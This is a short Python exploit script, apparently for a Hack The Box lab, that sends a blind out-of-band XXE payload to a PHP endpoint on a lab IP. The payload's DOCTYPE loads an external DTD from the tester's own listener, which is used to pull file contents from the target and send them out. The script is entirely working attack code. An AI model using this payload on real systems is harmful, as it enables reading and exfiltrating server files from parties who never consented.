import requests
import re
from bs4 import BeautifulSoup

IP = "10.129.144.35"
url = f"http://{IP}"

session = requests.Session()

# our ip = 10.10.14.29

xml = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://10.10.14.29:8000/oob_xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
"""

r = session.post(url + '/blind/submitDetails.php', data=xml)

# flagRgx = re.compile(r'HTB\{.*\}')
# flag = flagRgx.search(r.text)
# print(flag.group())
print(r.text)